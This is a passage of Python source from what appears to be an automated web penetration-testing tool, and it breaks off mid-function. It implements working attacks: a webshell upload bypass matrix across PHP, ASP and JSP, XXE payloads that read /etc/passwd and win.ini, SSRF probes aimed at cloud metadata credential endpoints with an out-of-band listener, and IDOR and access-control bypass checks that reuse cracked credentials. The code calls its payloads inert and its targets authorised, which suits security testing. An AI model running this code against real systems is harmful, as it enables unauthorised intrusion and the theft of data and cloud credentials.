def _upload_variants(lang: str, base: str, mark: str, a: int, b: int) -> list:
    """Extension / MIME / magic-byte bypass matrix for one language. The payload is inert — it
    echoes mark·(a*b)·mark so execution is provable by arithmetic. Each entry is
    (label, sent-filename, content-type, file-bytes, [names to fetch the stored file back])."""
    gif, png = b"GIF89a;\n", b"\x89PNG\r\n\x1a\n"
    if lang == "php":
        p = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>".encode()
        return [
            ("phtml",              f"{base}.phtml",   "image/jpeg",              p,       [f"{base}.phtml"]),
            ("php5",               f"{base}.php5",    "image/jpeg",              p,       [f"{base}.php5"]),
            ("pht",                f"{base}.pht",     "image/jpeg",              p,       [f"{base}.pht"]),
            ("phar",               f"{base}.phar",    "application/octet-stream", p,      [f"{base}.phar"]),
            ("php + image ctype",  f"{base}.php",     "image/png",               p,       [f"{base}.php"]),
            ("magic GIF89a .php",  f"{base}.php",     "image/gif",               gif + p, [f"{base}.php"]),
            ("magic PNG .phtml",   f"{base}.phtml",   "image/png",               png + p, [f"{base}.phtml"]),
            ("double .php.jpg",    f"{base}.php.jpg", "image/jpeg",              p,       [f"{base}.php.jpg", f"{base}.php"]),
            ("double .jpg.php",    f"{base}.jpg.php", "image/jpeg",              p,       [f"{base}.jpg.php"]),
            ("case .pHp",          f"{base}.pHp",     "image/jpeg",              p,       [f"{base}.pHp", f"{base}.php"]),
            ("trailing dot .php.", f"{base}.php.",    "image/jpeg",              p,       [f"{base}.php", f"{base}.php."]),
            ("nullbyte .php\\0.jpg", f"{base}.php\x00.jpg", "image/jpeg",        p,       [f"{base}.php"]),
        ]
    if lang == "asp":
        c = f'<%Response.Write("{mark}" & ({a}*{b}) & "{mark}")%>'.encode()               # classic ASP (VBScript)
        n = f'<%@ Page Language="C#"%><%Response.Write("{mark}"+({a}*{b})+"{mark}");%>'.encode()  # ASP.NET
        return [
            ("asp classic",       f"{base}.asp",      "image/jpeg", c,       [f"{base}.asp"]),
            ("asa",               f"{base}.asa",      "image/jpeg", c,       [f"{base}.asa"]),
            ("cer",               f"{base}.cer",      "image/jpeg", c,       [f"{base}.cer"]),
            ("asp;.jpg (IIS6)",   f"{base}.asp;.jpg", "image/jpeg", c,       [f"{base}.asp;.jpg", f"{base}.asp"]),
            ("magic GIF89a .asp", f"{base}.asp",      "image/gif",  gif + c, [f"{base}.asp"]),
            ("double .asp.jpg",   f"{base}.asp.jpg",  "image/jpeg", c,       [f"{base}.asp.jpg", f"{base}.asp"]),
            ("aspx .NET",         f"{base}.aspx",     "image/jpeg", n,       [f"{base}.aspx"]),
            ("aspx;.jpg",         f"{base}.aspx;.jpg", "image/jpeg", n,      [f"{base}.aspx;.jpg", f"{base}.aspx"]),
        ]
    if lang == "jsp":
        j = f'<% out.print("{mark}"+({a}*{b})+"{mark}"); %>'.encode()
        return [
            ("jsp",               f"{base}.jsp",      "image/jpeg", j,       [f"{base}.jsp"]),
            ("jspx",              f"{base}.jspx",     "image/jpeg", j,       [f"{base}.jspx"]),
            ("jsp;.jpg",          f"{base}.jsp;.jpg", "image/jpeg", j,       [f"{base}.jsp;.jpg", f"{base}.jsp"]),
            ("magic GIF89a .jsp", f"{base}.jsp",      "image/gif",  gif + j, [f"{base}.jsp"]),
            ("double .jsp.jpg",   f"{base}.jsp.jpg",  "image/jpeg", j,       [f"{base}.jsp.jpg", f"{base}.jsp"]),
        ]
    return []


def _multipart(fields: dict, file_field: str, filename: str, ctype: str, data: bytes) -> tuple:
    """Build a multipart/form-data body (bytes) + boundary from text fields and one file part."""
    boundary = "----pshunter" + "".join(random.choices("0123456789abcdef", k=16))
    out = b""
    for k, v in fields.items():
        out += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n"
                f"{v}\r\n").encode("utf-8", "replace")
    out += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; "
            f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n").encode("utf-8", "replace")
    out += data + f"\r\n--{boundary}--\r\n".encode()
    return out, boundary


def _tool_file_upload(ip: str, port: int, proto: str) -> str:
    """HTTP step-21 tool: attempt to upload a webshell through discovered upload forms, working
    an extension / MIME / magic-byte bypass matrix. The language auto-switches from the
    fingerprint — PHP by default, ASP/.NET on IIS, JSP on Tomcat/Java. The payload is INERT (it
    echoes a unique marker × arithmetic — no live command shell); the result is proven by
    fetching the stored file back and checking the arithmetic executed. RCE-confirmed vs
    merely-stored are reported separately, and every uploaded artifact is listed for manual
    removal. Stdlib only; a dead server raises. Authorised targets only — this writes files."""
    import http.client
    import ssl
    import time
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_UPLOAD_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_UPLOAD_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(131072).decode("utf-8", "replace")
            setc = resp.headers.get_all("Set-Cookie") or []
            return resp.status, data, setc, resp.headers.get("Location")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test upload")

    targets = _gather_upload_targets(ip, port, proto)
    langs = _detect_web_langs(ip, port, proto)
    deadline = time.time() + _UPLOAD_DEADLINE
    surfaces, rce, stored, artifacts = [], [], [], []
    tested = [0]

    def _verify(hostval, vpath, mark, product):
        """GET a stored file back → 'rce' if the arithmetic executed (mark·product·mark), 'stored'
        if our raw payload is served verbatim (upload worked, execution didn't), else None. The
        marker is unique per probe, so its mere presence is a reliable language-agnostic signal."""
        st, body, _sc, _loc = _req(hostval, "GET", vpath)
        if st is None or st == 404 or not body:
            return None
        if f"{mark}{product}{mark}" in body:
            return "rce"
        if mark in body:
            return "stored"
        return None

    def _locate(hostval, resp_body, names, mark, product):
        """Find where an accepted upload landed. Three strategies, cheapest first: (1) a URL the
        response leaks that carries one of the names we sent; (2) any other file URL the response
        leaks (the server renamed the upload) — safe to verify because our marker is unique;
        (3) a blind guess in the usual store dirs. Returns (url_path, 'rce'|'stored')/(None,None)."""
        for nm in names:
            m = re.search(r"((?:https?://[^\"'()<> ]+)?/[^\"'()<> ]*" + re.escape(nm) + r")",
                          resp_body or "")
            if m:
                pr = urllib.parse.urlparse(m.group(1))
                vpath = pr.path or m.group(1)
                v = _verify(hostval, vpath, mark, product)
                if v:
                    return vpath, v
        for cand in re.findall(r"(/[A-Za-z0-9_./-]+\.[A-Za-z0-9]{1,5})", resp_body or "")[:12]:
            v = _verify(hostval, cand, mark, product)
            tested[0] += 1
            if v:
                return cand, v
        for d in _UPLOAD_STORE_DIRS:
            if time.time() >= deadline:
                break
            for nm in names:
                v = _verify(hostval, d + nm, mark, product)
                tested[0] += 1
                if v:
                    return d + nm, v
        return None, None

    for hostval, path in targets:
        if time.time() >= deadline:
            break
        gs, gbody, gsc, _gl = _req(hostval, "GET", path)
        if gs is None:
            continue
        form = _parse_upload_form(gbody or "", path)
        if not form:
            continue
        surfaces.append(f"{hostval}{path} (field '{form['file']}')")
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in gsc)
        rce_hit, stored_hit = False, False       # one RCE ends the form; one stored is enough to note
        for lang in langs:                       # auto-switch payload language per the fingerprint
            if rce_hit or time.time() >= deadline:
                break
            token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
            base = "psh" + token
            mark = "PSHUP" + token
            a, b = random.randint(1000, 9999), random.randint(1000, 9999)
            product = str(a * b)
            for label, upname, ctype, data, names in _upload_variants(lang, base, mark, a, b):
                if time.time() >= deadline:
                    break
                body, boundary = _multipart(form["fields"], form["file"], upname, ctype, data)
                extra = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
                if cookie:
                    extra["Cookie"] = cookie
                st, rbody, _sc, _loc = _req(hostval, "POST", apath, body=body, extra=extra)
                tested[0] += 1
                if st is None:
                    continue
                accepted = st in (200, 201, 204, 301, 302, 303)
                vpath, verdict = _locate(hostval, rbody if accepted else "", names, mark, product)
                if verdict == "rce":
                    url = f"{scheme}://{hostval}:{port}{vpath}"
                    rce.append(f"  ✗ UPLOAD {url}  ({lang} · {label})  [via {hostval}{apath}]")
                    artifacts.append(f"{hostval}{vpath}")
                    rce_hit = True
                    break
                if verdict == "stored" and not stored_hit:
                    url = f"{scheme}://{hostval}:{port}{vpath}"
                    stored.append(f"  ⚠ UPLOAD {url}  ({lang} · {label}, exec unconfirmed)  [via {hostval}{apath}]")
                    artifacts.append(f"{hostval}{vpath}")
                    stored_hit = True
                    break                        # move to next language to seek an RCE
        if time.time() >= deadline:
            break

    reason = "deadline" if time.time() >= deadline else "complete"
    lines = [f"{scheme}://{ip}:{port}/ file-upload webshell ({'/'.join(langs)})",
             f"surfaces: {len(surfaces)} form · uploads tried {tested[0]} · "
             f"RCE {len(rce)} · stored {len(stored)} · {reason}"]
    if surfaces:
        lines.append("\nUPLOAD FORMS:")
        lines += [f"  {s}" for s in sorted(set(surfaces))]
    if rce:
        lines.append("\nRCE (code executed):")
        lines += rce
    if stored:
        lines.append("\nSTORED (upload accepted, execution unconfirmed):")
        lines += stored
    if artifacts:
        lines.append("\nartifacts to remove:")
        lines += [f"  {a}" for a in sorted(set(artifacts))]
    if not rce and not stored:
        lines.append("\nno upload bypass worked" if surfaces else "\nno upload form found")
    return "\n".join(lines)


# ── HTTP step 22: XXE & SSRF (read-only, in-band + out-of-band) ──
_XXES_DEADLINE = 300
_XXES_REQ_TIMEOUT = 8
_XXES_OOB_WAIT = 6              # s — one window after firing all blind probes of a phase
_XXES_MAX_TARGETS = 24         # per phase (SSRF combos / XML endpoints)
# query-param names that plausibly drive a server-side fetch (SSRF)
_SSRF_PARAMS = {
    "url", "uri", "link", "redirect", "redirect_url", "redirecturl", "next", "dest",
    "destination", "domain", "callback", "feed", "host", "target", "img", "image",
    "imageurl", "load", "src", "source", "proxy", "fetch", "webhook", "u", "page",
    "continue", "return", "returnurl", "out", "view", "site", "reference", "ref", "path",
}
_SSRF_CORE = ["url", "uri", "link", "redirect", "next", "dest", "image", "load",
              "feed", "callback", "target", "proxy"]      # injected on discovered endpoints
# cloud metadata endpoints: (label, url, markers that only appear in a real metadata response)
_SSRF_META = [
    ("aws",   "http://169.254.169.254/latest/meta-data/",
     ("ami-id", "instance-id", "security-credentials", "public-keys", "iam/")),
    ("gcp",   "http://metadata.google.internal/computeMetadata/v1/",
     ("computeMetadata", "project/", "instance/")),
    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ("azEnvironment", "vmId", "\"compute\"")),
]
# endpoints that classically parse XML / SOAP — POST an XML body here
_XXE_XML_PATHS = ["/xmlrpc.php", "/api", "/api/xml", "/soap", "/services", "/ws",
                  "/rest", "/rpc", "/graphql", "/feed", "/rss"]
# in-band XXE file-read probes: (xml body, detector regex, label)
_XXE_READ = [
    ('<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
     re.compile(r"root:.*?:0:0:"), "file:///etc/passwd"),
    ('<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<r>&xxe;</r>',
     re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I), "file:///c:/windows/win.ini"),
]


def _xxe_blind(url: str) -> str:
    """Blind-XXE body: a parameter entity whose SYSTEM id is our catcher URL. Resolving it makes
    the target fetch us — the fetch itself confirms outbound XML entity processing."""
    return ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % e SYSTEM "'
            + url + '"> %e;]>\n<r>1</r>')


class _OOBCatcher:
    """Short-lived HTTP catcher for blind XXE / SSRF confirmation: binds an ephemeral port on
    every interface, hands out marker URLs, and records which markers the target actually
    fetched (proving an outbound request it made on our behalf). Read-only and benign — it just
    answers 200. .ok is False if our source IP or the socket could not be set up."""

    def __init__(self, target_ip: str):
        import socket
        import threading
        self.ok = False
        self.myip = None
        self.hits = {}                                       # marker -> (addr, full request path)
        self._lock = threading.Lock()
        try:
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            u.connect((target_ip, 9))
            self.myip = u.getsockname()[0]
            u.close()
        except Exception:                                    # noqa: BLE001
            return
        try:
            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.bind(("0.0.0.0", 0))
            self._srv.listen(16)
            self._srv.settimeout(1.0)
        except Exception:                                    # noqa: BLE001
            return
        self.port = self._srv.getsockname()[1]
        self._run = True
        self._th = threading.Thread(target=self._loop, daemon=True)
        self._th.start()
        self.ok = True

    def _loop(self):
        import socket
        while self._run:
            try:
                conn, addr = self._srv.accept()
            except socket.timeout:
                continue
            except Exception:                                # noqa: BLE001
                break
            try:
                data = conn.recv(4096).decode("latin-1", "replace")
                m = re.match(r"[A-Z]+ (/\S*)", data)
                if m:
                    full = m.group(1)
                    seg = full.strip("/").split("/")[0].split("?")[0]
                    with self._lock:
                        self.hits[seg] = (addr[0], full)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            except Exception:                                # noqa: BLE001
                pass
            finally:
                try:
                    conn.close()
                except Exception:                            # noqa: BLE001
                    pass

    def url(self, marker: str) -> str:
        return f"http://{self.myip}:{self.port}/{marker}"

    def seen(self, marker: str):
        with self._lock:
            return self.hits.get(marker)

    def close(self):
        self._run = False
        try:
            self._srv.close()
        except Exception:                                    # noqa: BLE001
            pass


def _gather_ssrf_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path, param) SSRF candidates: endpoints whose query already carries an SSRF-ish
    param (from http-source), then core SSRF params injected on discovered dynamic endpoints."""
    import urllib.parse
    out, seen = [], set()

    def _add(h, p, param):
        base = p.split("#")[0]
        if not base.startswith("/"):
            return
        k = (h, base, param)
        if k not in seen:
            seen.add(k)
            out.append((h, base, param))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "http-source":
            for m in re.findall(r"https?://[^\s\"'<>]+\?[^\s\"'<>]+", output or ""):
                pr = urllib.parse.urlparse(m)
                for k, _v in urllib.parse.parse_qsl(pr.query):
                    if k.lower() in _SSRF_PARAMS:
                        _add(ip, pr.path + "?" + pr.query, k)

    endpoints = _gather_param_endpoints(ip, port, proto)
    for param in _SSRF_CORE:                                  # param-major → cover many endpoints
        for host, path in endpoints:
            _add(host, path, param)
    return out[:_XXES_MAX_TARGETS]


def _gather_xml_endpoints(ip: str, port: int, proto: str) -> list:
    """(hostval, path) endpoints that plausibly parse XML — classic SOAP/RPC/API paths on the
    host + vhosts, plus any api/soap/xml/rpc-looking path mined by dir-brute / http-source."""
    out, seen = [], set()

    def _add(h, p):
        base = p.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        if (h, base) not in seen:
            seen.add((h, base))
            out.append((h, base))

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in _XXE_XML_PATHS:
            _add(h, p)
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "http-source", "manual-paths"):
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                for m in re.findall(
                        r"(/[A-Za-z0-9_./-]*(?:api|soap|xml|rpc|ws|rest|feed|rss|graphql)"
                        r"[A-Za-z0-9_./-]*)", ln, re.I):
                    _add(host if sid in ("dir-brute", "manual-paths") else ip, m)
    return out[:_XXES_MAX_TARGETS]


def _tool_xxe_ssrf(ip: str, port: int, proto: str) -> str:
    """HTTP step-22 tool: probe for SSRF and XXE, read-only. SSRF: point fetch-style params at a
    short-lived listener we control (out-of-band, definitive) and at cloud-metadata endpoints
    (in-band). XXE: POST XML with an external entity reading /etc/passwd or win.ini (in-band file
    read) and a parameter entity pointing at our listener (blind, OOB). Nothing is written to the
    target. Stdlib only; a dead server raises. OOB needs the target to reach us back (egress)."""
    import http.client
    import ssl
    import time
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, ctype=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_XXES_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_XXES_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if ctype:
                hdr["Content-Type"] = ctype
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            return resp.status, resp.read(131072).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _set_param(path, param, value):
        pr = urllib.parse.urlparse(path)
        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(pr.query) if k != param]
        pairs.append((param, value))
        return pr.path + "?" + urllib.parse.urlencode(pairs)

    def _rnd():
        return "pshoob" + "".join(random.choices("0123456789abcdef", k=10))

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test XXE/SSRF")

    deadline = time.time() + _XXES_DEADLINE
    catcher = _OOBCatcher(ip)
    ssrf_meta, ssrf_oob, xxe_read, xxe_oob = [], [], [], []
    ssrf_surf, xml_surf = set(), set()

    # ── SSRF phase ──
    ssrf_oob_map = {}
    for hostval, path, param in _gather_ssrf_targets(ip, port, proto):
        if time.time() >= deadline:
            break
        ssrf_surf.add(f"{hostval}{path.split('?')[0]}?{param}=")
        meta_hit = False
        for label, murl, markers in _SSRF_META:
            st, body = _req(hostval, "GET", _set_param(path, param, murl))
            if st is not None and body and any(tok in body for tok in markers):
                ssrf_meta.append(f"  ✗ SSRF-META {hostval}{path.split('?')[0]}?{param}  "
                                 f"({label} metadata reachable)")
                meta_hit = True
                break
        if not meta_hit and catcher.ok:
            marker = _rnd()
            ssrf_oob_map[marker] = (hostval, path, param)
            _req(hostval, "GET", _set_param(path, param, catcher.url(marker)))
    if catcher.ok and ssrf_oob_map and time.time() < deadline:
        time.sleep(_XXES_OOB_WAIT)
        for marker, (hostval, path, param) in ssrf_oob_map.items():
            if catcher.seen(marker):
                ssrf_oob.append(f"  ✗ SSRF-OOB {hostval}{path.split('?')[0]}?{param}  "
                                f"(target fetched our listener)")

    # ── XXE phase ──
    xxe_oob_map = {}
    for hostval, path in _gather_xml_endpoints(ip, port, proto):
        if time.time() >= deadline:
            break
        read_hit = False
        for xml, detector, label in _XXE_READ:
            st, body = _req(hostval, "POST", path, body=xml, ctype="application/xml")
            if st is not None and body and detector.search(body):
                xxe_read.append(f"  ✗ XXE-READ {hostval}{path}  ({label})")
                read_hit = True
                break
            if st is not None and body and re.search(r"xml|entity|DOCTYPE|SOAP-ENV|not well-formed",
                                                     body, re.I):
                xml_surf.add(f"{hostval}{path}")
        if not read_hit and catcher.ok:
            marker = _rnd()
            xxe_oob_map[marker] = (hostval, path)
            _req(hostval, "POST", path, body=_xxe_blind(catcher.url(marker)),
                 ctype="application/xml")
    if catcher.ok and xxe_oob_map and time.time() < deadline:
        time.sleep(_XXES_OOB_WAIT)
        for marker, (hostval, path) in xxe_oob_map.items():
            if catcher.seen(marker):
                xxe_oob.append(f"  ✗ XXE-OOB {hostval}{path}  (target fetched our listener)")

    catcher.close()

    oob_note = "" if catcher.ok else "  (OOB listener unavailable — in-band checks only)"
    reason = "deadline" if time.time() >= deadline else "complete"
    lines = [f"{scheme}://{ip}:{port}/ XXE & SSRF probe{oob_note}",
             f"ssrf surfaces: {len(ssrf_surf)} · xml endpoints: {len(xml_surf) or 0} · "
             f"SSRF[meta {len(ssrf_meta)} · oob {len(ssrf_oob)}] · "
             f"XXE[read {len(xxe_read)} · oob {len(xxe_oob)}] · {reason}"]
    if ssrf_meta:
        lines.append("\nSSRF → cloud metadata:")
        lines += ssrf_meta
    if ssrf_oob:
        lines.append("\nSSRF (out-of-band confirmed):")
        lines += ssrf_oob
    if xxe_read:
        lines.append("\nXXE file read:")
        lines += xxe_read
    if xxe_oob:
        lines.append("\nXXE (out-of-band confirmed):")
        lines += xxe_oob
    if xml_surf and not xxe_read and not xxe_oob:
        lines.append("\nXML-parsing endpoints (no XXE confirmed):")
        lines += [f"  {s}" for s in sorted(xml_surf)]
    if not (ssrf_meta or ssrf_oob or xxe_read or xxe_oob):
        lines.append("\nno XXE/SSRF confirmed")
    return "\n".join(lines)


# ── HTTP step 23: IDOR / broken access control (read-only, unauth + optional creds) ──
_IDOR_DEADLINE = 240
_IDOR_REQ_TIMEOUT = 8
_IDOR_MAX_ENDPOINTS = 20        # ID-bearing endpoints to enumerate
_IDOR_MAX_PRIV = 24            # privileged paths to force-browse / bypass
_IDOR_ID_PARAMS = {
    "id", "uid", "user", "userid", "user_id", "account", "acct", "order", "orderid",
    "doc", "docid", "document", "file", "fileid", "invoice", "pid", "record", "rid",
    "num", "no", "key", "ref", "item", "ticket", "pk", "msg", "message",
}
_PRIV_PATH_RE = re.compile(
    r"admin|dashboard|manage|console|users?|account|api|internal|config|report|billing|"
    r"invoice|setting|profile|panel|staff|moderator", re.I)
_PRIV_CONTENT_RE = re.compile(
    r"logout|log ?out|dashboard|administration|manage users|delete\b|\brole\b|privilege|"
    r"add user|user list|<table|control panel|settings", re.I)
_PII_RE = re.compile(
    r"[\w.+-]+@[\w-]+\.[\w.-]+|"                              # email
    r"[\"']?(?:user_?name|email|first_?name|last_?name|phone|address|ssn|balance|role|"
    r"is_?admin|api[_-]?key|token|password)[\"']?\s*[:=]", re.I)
_IDOR_FALLBACK = ["/user/1", "/users/1", "/api/users/1", "/api/user/1", "/account/1",
                  "/accounts/1", "/profile/1", "/order/1", "/orders/1", "/invoice/1",
                  "/api/v1/users/1", "/?id=1"]
_PRIV_FALLBACK = ["/admin", "/admin/users", "/administrator", "/dashboard", "/manage",
                  "/management", "/settings", "/config", "/api/users", "/api/admin",
                  "/users", "/staff", "/panel", "/console"]


def _gather_priv_paths(ip: str, port: int, proto: str) -> list:
    """(hostval, path, status) privileged surfaces to force-browse: dir-brute hits that returned
    401/403 or look admin-ish, plus a fallback list, on the host and every vhost."""
    out, seen = [], set()

    def _add(host, path, status):
        base = path.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        if (host, base) not in seen:
            seen.add((host, base))
            out.append((host, base, status))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "manual-paths"):
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] (\d{3})\s+(\S+)", ln)
                if mp and (int(mp.group(1)) in (401, 403) or _PRIV_PATH_RE.search(mp.group(2))):
                    _add(host, mp.group(2), int(mp.group(1)))

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in _PRIV_FALLBACK:
            _add(h, p, None)
    return out[:_IDOR_MAX_PRIV]


def _gather_id_endpoints(ip: str, port: int, proto: str) -> list:
    """ID-bearing endpoints to enumerate. Each entry is either
    ('param', host, path, param, id_int, label) or ('path', host, prefix, suffix, id_int, label)."""
    import urllib.parse
    out, seen = [], set()

    def _add(host, path):
        base = path.split("#")[0]
        if not base.startswith("/"):
            return
        pr = urllib.parse.urlparse(base)
        for k, v in urllib.parse.parse_qsl(pr.query):        # a numeric ID-ish query param
            if k.lower() in _IDOR_ID_PARAMS and v.isdigit():
                key = (host, pr.path, "param", k)
                if key not in seen:
                    seen.add(key)
                    out.append(("param", host, base, k, int(v), f"{pr.path}?{k}={{id}}"))
                return
        m = re.search(r"(\d+)(?!.*\d)", pr.path)             # else a trailing path integer
        if m:
            key = (host, pr.path, "path", m.start())
            if key not in seen:
                seen.add(key)
                pre, suf = pr.path[:m.start()], pr.path[m.end():]
                out.append(("path", host, pre, suf, int(m.group(1)), f"{pre}{{id}}{suf}"))

    for host, path in _gather_param_endpoints(ip, port, proto):
        _add(host, path)
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "manual-paths"):
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp:
                    _add(host, mp.group(1))
        elif sid == "http-source":
            for m in re.findall(r"https?://[^\s\"'<>]+", output or ""):
                pr = urllib.parse.urlparse(m)
                _add(ip, pr.path + (f"?{pr.query}" if pr.query else ""))

    if not out:                                              # nothing discovered → sensible guesses
        vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
        for h in [ip] + [v for v in vhosts if v != ip]:
            for p in _IDOR_FALLBACK:
                _add(h, p)
    return out[:_IDOR_MAX_ENDPOINTS]


def _parse_valid_creds(ip: str, port: int, proto: str) -> list:
    """(hostval, path, kind, user, pass) valid credentials harvested earlier by default-creds
    (`! user:pass @ /path (form) [host]`) or login-brute (`✗ CRACKED user:pass @ /path (form)`
    under a `[host]` section)."""
    out = []
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("default-creds", "manual-creds"):
            for m in re.finditer(
                    r"! (\S+):(\S+) @ (\S+) \((Basic|form)\) \[([^\]]+)\]", output or ""):
                pw = "" if m.group(2) == "<blank>" else m.group(2)
                out.append((m.group(5), m.group(3), m.group(4), m.group(1), pw))
        elif sid == "login-brute":
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mc = re.match(r"\s*✗ CRACKED (\S+):(\S+) @ (\S+) \(([^)]+)\)", ln)
                if mc:
                    pw = "" if mc.group(2) == "<blank>" else mc.group(2)
                    kind = "Basic" if "basic" in mc.group(4).lower() else "form"
                    out.append((host, mc.group(3), kind, mc.group(1), pw))
    return out


def _tool_idor_bac(ip: str, port: int, proto: str) -> str:
    """HTTP step-23 tool: hunt IDOR / broken access control, read-only. (1) Force-browse
    privileged paths unauthenticated → flag privileged 200s. (2) Retry 401/403 paths with
    header / path / safe-method bypass vectors. (3) Enumerate ID-bearing endpoints and flag
    when neighbouring IDs return distinct records carrying PII (gated to keep FPs low). If
    default-creds found a valid login, it re-authenticates and re-runs the ID enumeration with
    that session (the strongest IDOR signal). Only GET/HEAD/OPTIONS — never PUT/DELETE/POST with
    a body — so nothing on the target is mutated. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import base64
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_IDOR_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_IDOR_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(131072).decode("utf-8", "replace")
            return resp.status, data, (resp.headers.get_all("Set-Cookie") or [])
        except Exception:                                     # noqa: BLE001
            return None, None, []
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _set_param(path, param, value):
        pr = urllib.parse.urlparse(path)
        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(pr.query) if k != param]
        pairs.append((param, value))
        return pr.path + "?" + urllib.parse.urlencode(pairs)

    def _similar(a, b):
        a, b = a or "", b or ""
        if not b:
            return not a
        return abs(len(a) - len(b)) <= max(48, int(len(b) * 0.06))

    _bcache = {}

    def _baseline(host):
        if host not in _bcache:
            _, hb, _ = _req(host, "GET", "/")
            rnd = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
            _, nb, _ = _req(host, "GET", "/pshx" + rnd)
            _bcache[host] = (hb or "", nb or "")
        return _bcache[host]

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test IDOR/BAC")

    deadline = time.time() + _IDOR_DEADLINE
    idor, bac, authz, enum = [], [], [], []

    def _bypass_vectors(p):
        no_slash = p.rstrip("/")
        return [
            ("X-Forwarded-For 127.0.0.1", "GET", p, {"X-Forwarded-For": "127.0.0.1"}),
            ("X-Custom-IP-Authorization", "GET", p, {"X-Custom-IP-Authorization": "127.0.0.1"}),
